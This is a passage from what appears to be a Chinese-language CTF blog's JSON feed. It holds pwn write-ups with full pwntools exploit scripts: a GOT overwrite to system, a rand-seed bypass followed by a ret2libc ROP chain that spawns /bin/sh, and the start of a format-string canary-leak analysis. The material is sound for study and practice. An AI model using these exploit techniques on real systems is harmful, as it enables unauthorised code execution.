class=\"token comment\"># gdb.attach(io)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>paylaod <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1c</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'\\x88\\xff\\xff\\xff'</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>paylaod<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\"># gdb.attach(io)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\"># io.recvuntil(b'bye~\\n')</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\"># payload1 = b'\\xe0\\xef'</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'bye~\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x31\\x0a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">b'c'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x1c</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'\\x78\\xff\\xff\\xff'</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'input>>\\n'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'bye~\\n'</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\"># gdb.attach(io)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'input>>\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token comment\"># io.send(b'a')</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"华东赛区\"><a class=\"markdownIt-Anchor\" href=\"#华东赛区\">#</a> 华东赛区：</h3>\n<h5 id=\"检查程序-2\"><a class=\"markdownIt-Anchor\" href=\"#检查程序-2\">#</a> 检查程序：</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230722171805702.png\" alt=\"image-20230722171805702\"></p>\n<h5 id=\"执行程序\"><a class=\"markdownIt-Anchor\" href=\"#执行程序\">#</a> 执行程序：</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230722171849970.png\" alt=\"image-20230722171849970\"></p>\n<h5 id=\"放入ida-2\"><a class=\"markdownIt-Anchor\" href=\"#放入ida-2\">#</a> 放入 IDA：</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230722172024544.png\" alt=\"image-20230722172024544\"></p>\n<h5 id=\"发现漏洞函数\"><a class=\"markdownIt-Anchor\" href=\"#发现漏洞函数\">#</a> 发现漏洞函数：</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230722172050505.png\" alt=\"image-20230722172050505\"></p>\n<p>整体思路，绕过随机数检查判断，到达漏洞函数，获取 shell。seed 种子是 4 字节大小要注意</p>\n<h5 id=\"exp-2\"><a class=\"markdownIt-Anchor\" href=\"#exp-2\">#</a> exp:</h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'splitw'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'-h'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>local <span class=\"token operator\">=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">if</span> local <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>libc <span class=\"token operator\">=</span> cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x40101a</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>pop_rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x00401443</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>main <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>gift <span class=\"token operator\">=</span> <span class=\"token number\">0x040125D</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>b <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:\\n'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># v6 = (libc.rand(b)-1) %100 +2</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\"># p.sendafter(b'number:\\n',p32(v6))</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    v6 <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span><span class=\"token number\">100</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'number:\\n'</span><span class=\"token punctuation\">,</span>p32<span class=\"token punctuation\">(</span>v6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\"># gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.27.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'your gift!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>gift<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>puts_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>libc_base <span class=\"token operator\">=</span> puts_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>sys <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>binsh <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>但是我本地的 libc 下载来，还是打不通，真的不知道啊啊啊啊啊啊</p>\n<p>能打通本地的 exp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'splitw'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'-h'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>local <span class=\"token operator\">=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span> local <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>libc <span class=\"token operator\">=</span> cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x40101a</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>pop_rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x401443</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>main <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>gift <span class=\"token operator\">=</span> <span class=\"token number\">0x40125D</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>b <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:\\n'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    v6 <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span><span class=\"token number\">100</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'number:\\n'</span><span class=\"token punctuation\">,</span>p32<span class=\"token punctuation\">(</span>v6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'your gift!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>payload1 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>gift<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>puts_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">,</span>puts_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>libcbase <span class=\"token operator\">=</span> puts_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>addr_system <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>addr_binsh <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"str_bin_sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>payload2 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>addr_binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>addr_system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>os: 早知道 libcsearcher 能打通，谁会掉头发！！！！</p>\n",
            "tags": [
                "pie",
                "got改写",
                "随机数检查"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2023/08/02/find-flag/",
            "url": "https://yhuanhuan01.github.io/2023/08/02/find-flag/",
            "title": "find_flag",
            "date_published": "2023-08-02T10:44:10.000Z",
            "content_html": "<h1 id=\"题目复现深育杯-2021find_flag\"><a class=\"markdownIt-Anchor\" href=\"#题目复现深育杯-2021find_flag\">#</a> 题目复现 ——[深育杯 2021] find_flag</h1>\n<p>pie 与 canary 同时开启，并且有格式化字符串。</p>\n<h3 id=\"检查程序\"><a class=\"markdownIt-Anchor\" href=\"#检查程序\">#</a> 检查程序：</h3>\n<p><img data-src=\"/img/find_flag/image-20230609204936112.png\" alt=\"image-20230609204936112\"></p>\n<p>保护很全面。</p>\n<p><img data-src=\"/img/find_flag/image-20230609205227082.png\" alt=\"image-20230609205227082\"></p>\n<p>可以看的出，在第一处有格式化字符串漏洞。</p>\n<h3 id=\"ida分析\"><a class=\"markdownIt-Anchor\" href=\"#ida分析\">#</a> IDA 分析：</h3>\n<p><img data-src=\"/img/find_flag/image-20230609205448884.png\" alt=\"image-20230609205448884\"></p>\n<p>看了一下 mian 函数，将函数重命名，pwn 是我们有漏洞的地方。</p>\n<p><img data-src=\"/img/find_flag/image-20230609205602697.png\" alt=\"image-20230609205602697\"></p>\n<p>可以看到 gets 函数可以进行栈溢出，但是有 canary 保护，所以我们需要泄露 canary，可以利用格式化字符串去泄露 canary 并覆写在栈上。</p>\n<p><img data-src=\"/img/find_flag/image-20230609205729803.png\" alt=\"image-20230609205729803\"></p>\n<p>发现 backdoor。但是开了 pie，我们应该无法利用后们，但是好在<strong>只读变量（const 修饰的）和字符串变量</strong>放入<strong> rodata</strong> 区。还是可以利用的。</p>\n<h3 id=\"gdb分析\"><a class=\"markdownIt-Anchor\" href=\"#gdb分析\">#</a> gdb 分析:</h3>\n<p>打断点在 printf 处（不知到为什么不能在 main 函数处大不了断点，很奇怪</p>\n<p><img data-src=\"/img/find_flag/image-20230609210601700.png\" alt=\"image-20230609210601700\"></p>\n<p>一直步到下图处</p>\n<p><img data-src=\"/img/find_flag/image-20230609210758887.png\" alt=\"image-20230609210758887\"></p>\n<p>看栈信息，很明显能看到 canary——&gt;</p>\n<blockquote>\n<p>0b:0058│             0x7fffffffdd18 ◂— 0x121203e586d31600</p>\n</blockquote>\n<p><img data-src=\"/img/find_flag/image-20230609210832637.png\" alt=\"image-20230609210832637\"></p>\n<p>看一下距格式化字符串的偏移。</p>\n<p><img data-src=\"/img/find_flag/image-20230609211002101.png\" alt=\"image-20230609211002101\"></p>\n<p>但是难点不是在泄露 canary，而是在泄露基址上去，需要了解 pie 和栈，可以看到，在 rbp 